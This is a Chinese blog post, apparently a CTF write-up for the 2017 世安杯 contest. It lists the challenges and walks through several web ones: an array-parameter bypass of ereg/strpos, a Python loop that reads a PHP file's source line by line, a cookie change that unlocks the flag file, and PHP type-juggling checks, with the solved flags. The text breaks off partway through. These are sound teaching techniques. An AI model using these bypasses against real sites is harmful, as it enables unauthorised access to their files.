<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googlea4e6eb27cf4f8663.html" />














  
  
    
  
  <link href="https://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css" rel="stylesheet" type="text/css" />







  

<link href="https://cdn.bootcss.com/font-awesome/4.6.2/fonts/fontawesome-webfont.svg" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">


  <link rel="manifest" href="/images/manifest.json">


  <meta name="msapplication-config" content="/images/browserconfig.xml" />



  <meta name="keywords" content="CTF,WriteUp," />










<meta name="description" content="一个比较无语的比赛，还是记录一下解题姿势">
<meta name="keywords" content="CTF,WriteUp">
<meta property="og:type" content="article">
<meta property="og:title" content="世安杯-WriteUp">
<meta property="og:url" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/index.html">
<meta property="og:site_name" content="Wz&#39;s Blog">
<meta property="og:description" content="一个比较无语的比赛，还是记录一下解题姿势">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/9-26.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/21-05-53.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/21-13-04.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/21-20-13.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/23-03-15.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/21-21-24.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/21-57-14.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/22-04-06.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/22-07-03.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/22-50-20.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/16-05-41.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/19-09-50.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/19-13-37.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/19-15-03.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/19-23-06.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/19-24-48.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/15-38-06.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/15-48-59.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/15-49-13.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/15-49-20.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/15-59-10.jpg">
<meta property="og:updated_time" content="2018-10-29T03:31:58.929Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="世安杯-WriteUp">
<meta name="twitter:description" content="一个比较无语的比赛，还是记录一下解题姿势">
<meta name="twitter:image" content="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/9-26.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/"/>





  <title>世安杯-WriteUp | Wz's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Wz's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">安全菜鸡的挖坑填坑之旅</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            浏览
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.wzsite.cn/2017/10/09/世安杯-WriteUp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="W z">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Wz's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">世安杯-WriteUp</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-09T20:37:00+08:00">
                2017-10-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全之旅/" itemprop="url" rel="index">
                    <span itemprop="name">安全之旅</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <img src="/2017/10/09/世安杯-WriteUp/9-26.jpg" alt="9-26.jpg" title="">
<blockquote>
<p>一个比较无语的比赛，还是记录一下解题姿势</p>
</blockquote>
<a id="more"></a>
<p>这是一个实验吧和西普学院搞的比赛，说实话办得不太用心<br>题目基本都是以前CTF或者实验吧的一些原题，水份太多了，连flag都没改，直接搜到之前的wp提交就行了，这也是比赛很无语的一个地方</p>
<p>还是记录一下姿势</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><table>
<thead>
<tr>
<th>类型</th>
<th>题目</th>
<th>答题链接</th>
<th>描述</th>
<th>分值</th>
</tr>
</thead>
<tbody>
<tr>
<td>web</td>
<td>ctf入门级题目</td>
<td><a href="http://ctf1.shiyanbar.com/shian-rao/" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-rao/</a></td>
<td>有源码哦！</td>
<td>100</td>
<td></td>
</tr>
<tr>
<td></td>
<td>曲奇</td>
<td><a href="http://ctf1.shiyanbar.com/shian-quqi/" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-quqi/</a></td>
<td>曲奇特别好吃！！！</td>
<td>225</td>
<td></td>
</tr>
<tr>
<td></td>
<td>类型</td>
<td><a href="http://ctf1.shiyanbar.com/shian-leixing/" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-leixing/</a></td>
<td>php有好多类型啊</td>
<td>200</td>
<td></td>
</tr>
<tr>
<td></td>
<td>登录</td>
<td><a href="http://ctf1.shiyanbar.com/shian-s/" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-s/</a></td>
<td>有提示</td>
<td>150</td>
<td></td>
</tr>
<tr>
<td></td>
<td>admin</td>
<td><a href="http://ctf1.shiyanbar.com/shian-du/" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-du/</a></td>
<td>you are not admin!</td>
<td>250</td>
<td></td>
</tr>
<tr>
<td>逆向</td>
<td>console</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/console.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/console.rar</a></td>
<td>好像是微软的语言吧。</td>
<td>200</td>
<td></td>
</tr>
<tr>
<td></td>
<td>getflag</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/get_flag.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/get_flag.rar</a></td>
<td>算法其实特别简答，但是好像无法静态啊!啊！啊！</td>
<td>225</td>
<td></td>
</tr>
<tr>
<td></td>
<td>bin</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/re.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/re.rar</a></td>
<td>linux可执行程序逆向一则。</td>
<td>300</td>
<td></td>
</tr>
<tr>
<td></td>
<td>动态暴力破解</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/baopo.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/baopo.rar</a></td>
<td>下断点，然后手工暴力破解</td>
<td>275</td>
<td></td>
</tr>
<tr>
<td></td>
<td>android</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/android.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/android.rar</a></td>
<td>apk的逆向</td>
<td>250</td>
<td></td>
</tr>
<tr>
<td></td>
<td>简单算法</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/hackme.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/hackme.rar</a></td>
<td>一个简单的算法而已。</td>
<td>200</td>
<td></td>
</tr>
<tr>
<td>隐写</td>
<td>low</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/low.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/low.rar</a></td>
<td>low low check out!</td>
<td>250</td>
<td></td>
</tr>
<tr>
<td></td>
<td>斑马斑马</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/banmabanma.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/banmabanma.rar</a></td>
<td>斑马斑马，你不要睡着啦，再给我看看你受伤的尾巴，我不想去触碰你伤口的疤，我只想掀起你的头发。</td>
<td>125</td>
<td></td>
</tr>
<tr>
<td></td>
<td>CreateByWho</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/CreateByWho.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/CreateByWho.rar</a></td>
<td>零碎的二维码，好像还缺少几块！！！</td>
<td>200</td>
<td></td>
</tr>
<tr>
<td></td>
<td>适合作为桌面的图片</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/desktop.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/desktop.rar</a></td>
<td>让你的才思迸发出来吧！！</td>
<td>150</td>
<td></td>
</tr>
<tr>
<td>杂项</td>
<td>reverseMe</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/reverseMe.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/reverseMe.rar</a></td>
<td>这是一个什么文件呢？</td>
<td>150</td>
<td></td>
</tr>
<tr>
<td></td>
<td>珍妮的qq号</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/zhenni.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/zhenni.rar</a></td>
<td>珍妮的QQ是一个靓号哦</td>
<td>100</td>
<td></td>
</tr>
<tr>
<td></td>
<td>心仪的公司</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/webshell.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/webshell.rar</a></td>
<td>小黑在拿到webshell后，马上就获得了自己心仪公司的照片</td>
<td>150</td>
<td></td>
</tr>
<tr>
<td>    密码学</td>
<td>des</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/decode.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/decode.rar</a></td>
<td>DES加密算法！！</td>
<td>400</td>
<td></td>
</tr>
<tr>
<td></td>
<td>rsa</td>
<td><a href="http://ctf1.shiyanbar.com/shian-file/rsa.rar" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-file/rsa.rar</a></td>
<td>rsa</td>
<td>300</td>
<td></td>
</tr>
</tbody>
</table>
<hr>
<p>Web整体比较简单</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="ctf入门级题目"><a href="#ctf入门级题目" class="headerlink" title="ctf入门级题目"></a>ctf入门级题目</h4><p>直接给出源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">'*********'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><strong>分析:</strong><br>   题目的意思是既让你输入<code>a-zA-Z0-9</code>的数字字母又叫你输入包含<code>--</code>字符的password ，逻辑上显然是不通的，所以我们需要的是绕过ereg和strpos。<br>用数组传递就能满足条件了<br>ereg无法处理数组，当$__GET[‘password’]为数组的时候会返回FALSE,而strpos找不到<code>--</code>也会返回FALSE 故传一个数组即可满足条件</p>
<img src="/2017/10/09/世安杯-WriteUp/21-05-53.jpg" alt="21-05-53.jpg" title="">
<p><code>flag{Maybe_using_rexpexp_wasnt_a_clever_move}</code></p>
<h4 id="曲奇"><a href="#曲奇" class="headerlink" title="曲奇"></a>曲奇</h4><p>进去就是一个看起来提示性很强的url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&amp;file=a2V5LnR4dA==</div></pre></td></tr></table></figure>
<img src="/2017/10/09/世安杯-WriteUp/21-13-04.jpg" alt="21-13-04.jpg" title="">
<p><code>a2V5LnR4dA==</code>base64 decode得key.txt<br>顺理成章地想到文件读取<br>尝试访问<a href="http://ctf1.shiyanbar.com/shian-quqi/key.txt" target="_blank" rel="external">http://ctf1.shiyanbar.com/shian-quqi/key.txt</a><br>成功访问到相同内容<br>且<code>line</code>这个参数经过测试应该是读取第几行的内容的作用<br>故写了几行Python读取源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url =  <span class="string">"http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&#123;&#125;&amp;file=aW5kZXgucGhw"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">100</span>):</div><div class="line">    <span class="keyword">print</span> requests.get(url.format(i,)).text,</div></pre></td></tr></table></figure>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">""</span>);</div><div class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;file=a2V5LnR4dA=="</span>);</div><div class="line">$file_list = <span class="keyword">array</span>(</div><div class="line"><span class="string">'0'</span> =&gt;<span class="string">'key.txt'</span>,</div><div class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</div><div class="line">);</div><div class="line"> </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>]==<span class="string">'li_lr_480'</span>)&#123;</div><div class="line">$file_list[<span class="number">2</span>]=<span class="string">'thisis_flag.php'</span>;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</div><div class="line">$fa = file($file);</div><div class="line"><span class="keyword">echo</span> $fa[$line];</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>思路很简单，直接用burp改个cookie就好了</p>
<img src="/2017/10/09/世安杯-WriteUp/21-20-13.jpg" alt="21-20-13.jpg" title="">
<p><code>flag{UHGgd3rfH*(3HFhuiEIWF}</code></p>
<h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>直接是源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$a=<span class="number">0</span>;</div><div class="line">$b=<span class="number">0</span>;</div><div class="line">$c=<span class="number">0</span>;</div><div class="line">$d=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>]))</div><div class="line">&#123;</div><div class="line">        $x1 = $_GET[<span class="string">'x1'</span>];</div><div class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">switch</span> ($x1)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                $a=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($x2))&#123;</div><div class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123;</div><div class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>);</div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]);</div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$x3 = $_GET[<span class="string">'x3'</span>];</div><div class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">            $d=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>看来是要过关斩将了</p>
<p>一步一步来<br><strong>先看第一关</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">if (isset($_GET[&apos;x1&apos;]))</div><div class="line">&#123;</div><div class="line">        $x1 = $_GET[&apos;x1&apos;];</div><div class="line">        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</div><div class="line">        switch ($x1)</div><div class="line">        &#123;</div><div class="line">        case 0:</div><div class="line">        case 1:</div><div class="line">                $a=1;</div><div class="line">                break;</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>x1</code> 不能是 <code>1</code> 但是又要 <code>case 1</code><br>直接用不是数字来就好了，普通字母就能绕过了<br>为了加深理解，本地搭建了一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>]))</div><div class="line">&#123;</div><div class="line">    $x1 =@ $_GET[<span class="string">'x1'</span>];</div><div class="line">    $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">switch</span> ($x1)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">            <span class="keyword">echo</span> <span class="string">"= =0"</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">            <span class="keyword">echo</span> <span class="string">"= =!"</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">            <span class="keyword">echo</span> <span class="string">"= =2!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输入x1为不是数字的就能过</p>
<img src="/2017/10/09/世安杯-WriteUp/23-03-15.jpg" alt="23-03-15.jpg" title="">
<p><strong>然后是第二关:</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($x2))&#123;</div><div class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123;</div><div class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>);</div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]);</div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>$x2</code>是个要被解释成数组的变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">   <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123;</div><div class="line">       ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
